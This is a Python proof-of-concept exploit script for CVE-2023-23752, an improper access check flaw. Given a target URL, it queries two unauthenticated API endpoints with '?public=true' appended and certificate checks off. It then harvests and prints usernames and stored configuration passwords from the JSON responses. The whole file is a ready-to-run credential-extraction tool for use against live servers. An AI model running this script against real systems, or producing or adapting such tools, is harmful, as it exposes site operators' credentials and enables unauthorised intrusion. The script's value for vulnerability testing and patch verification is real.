#!/bin/python3

import json
import requests
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning
from rich.console import Console
import argparse

def ascii():
    console.print("[magenta]┏┓┓┏┏┓  ┏┓┏┓┏┓┏┓  ┏┓┏┓━┓┏━┏┓[/magenta]")
    console.print("[magenta]┃ ┃┃┣ ━━┏┛┃┫┏┛ ┫━━┏┛ ┫ ┃┗┓┏┛[/magenta]")
    console.print("[magenta]┗┛┗┛┗┛  ┗━┗┛┗━┗┛  ┗━┗┛ ╹┗┛┗━[/magenta]")
    console.print("Coded By: K3ysTr0K3R --> Hug me ʕっ•ᴥ•ʔっ")
    print("")

user_agent = {'User-Agent': 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16'}
disable_warnings(InsecureRequestWarning)
console = Console()

def check_vuln(target, path):
    console.print("[blue][*][/blue] Checking if target is vulnerable")

    send_get = requests.get(target + path, headers=user_agent, verify=False)
    if send_get.status_code == 200:
        console.print("[green][+][/green] Target is vulnerable")
        console.print(f"[blue][*][/blue] Launching exploit against: {target}")
    else:
        console.print("[red][~][/red] Target is not vulnerable")
        exit()

def fetch_usernames(target, path):
    print("---" * 37)
    console.print(f"[blue][*][/blue] Checking if target is vulnerable for usernames at path: {path}")

    send_get = requests.get(target + path, headers=user_agent, verify=False).text
    try:
        resp_json = json.loads(send_get)
        if "data" in resp_json and len(resp_json["data"]) > 0:
            console.print("[green][+][/green] Target is vulnerable for usernames")
            console.print(f"[green][+][/green] Gathering username(s) for: {target}")
            users = resp_json["data"]
            for user in users:
                attributes = user.get("attributes", {})
                username = attributes.get("username")
                if username:
                    console.print(f"[green][+][/green] Username: {username}")
                else:
                    console.print("[red][~][/red] No usernames found")
        else:
            console.print("[red][~][/red] No usernames found or empty response")
    except json.JSONDecodeError:
        console.print("[yellow][!][/yellow] Error occurred while checking for usernames")

def fetch_passwords(target, path):
    print("---" * 37)
    console.print(f"[blue][*][/blue] Checking if target is vulnerable for passwords at path: {path}")

    send_get = requests.get(target + path, headers=user_agent, timeout=3, verify=False).text
    try:
        resp_json = json.loads(send_get)
        if "data" in resp_json and len(resp_json["data"]) > 0:
            console.print("[green][+][/green] Target is vulnerable for passwords")
            console.print(f"[green][+][/green] Gathering password(s) for: {target}")
            passwords = resp_json["data"]
            for pwd in passwords:
                attributes = pwd.get("attributes", {})
                password = attributes.get("password")
                if password:
                    console.print(f"[green][+][/green] Password: {password}")
                else:
                    console.print("[red][~][red/] No passwords found")
        else:
            console.print("[red][~][/red] No passwords found or empty response")
    except json.JSONDecodeError:
        console.print("[yellow][!][/yellow] Error occurred while checking for passwords")

def exploit(target):
    vuln_path_users = '/api/index.php/v1/users?public=true'
    vuln_path_passwords = '/api/index.php/v1/config/application?public=true'

    check_vuln(target, vuln_path_users)
    fetch_usernames(target, vuln_path_users)
    fetch_passwords(target, vuln_path_passwords)

def main():
    ascii()
    parser = argparse.ArgumentParser(description="A PoC for CVE-2023-23752 - Improper access check")
    parser.add_argument("-u", "--url", help="Specify the target URL", required=True)
    args = parser.parse_args()

    target_url = args.url
    exploit(target_url)

if __name__ == "__main__":
    main()
